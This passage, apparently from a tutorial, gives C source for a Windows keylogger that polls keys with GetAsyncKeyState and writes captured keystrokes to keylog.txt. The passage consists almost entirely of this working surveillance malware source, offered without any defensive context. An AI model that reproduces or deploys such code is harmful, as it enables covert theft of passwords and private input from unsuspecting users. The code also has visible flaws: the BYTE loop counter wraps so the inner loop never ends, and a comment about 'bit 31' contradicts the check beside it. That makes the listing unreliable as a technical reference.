## Userland Implementation (Windows)

### Method 1: GetAsyncKeyState Polling Loop
```c
#include <windows.h>
#include <stdio.h>

int main(void) {
    FILE* log = fopen("keylog.txt", "a+");
    if (!log) return 1;

    while (1) {
        // Poll all virtual keys (8-255)
        for (BYTE key = 0x08; key <= 0xFF; key++) {
            SHORT state = GetAsyncKeyState(key);

            // Check if key was pressed (bit 31 set)
            if ((state & 0x0001) && !(GetKeyState(key) & 0x8000)) {
                // Handle special keys
                switch (key) {
                    case VK_RETURN: fputs("[ENTER]\n", log); break;
                    case VK_SPACE:  fputs(" ", log); break;
                    case VK_BACK:   fputs("[BACKSPACE]", log); break;
                    case VK_TAB:    fputs("\t", log); break;
                    default:
                        // Convert virtual key to character
                        BYTE keyboard_state[256] = {0};
                        WORD ascii_value = 0;
                        if (ToAscii(key, MapVirtualKey(key, MAPVK_VK_TO_VSC),
                                    keyboard_state, &ascii_value, 0)) {
                            fprintf(log, "%c", (char)ascii_value);
                        }
                }
                fflush(log);
            }
        }
        Sleep(10); // Prevent CPU saturation
    }
    fclose(log);
    return 0;
}
```

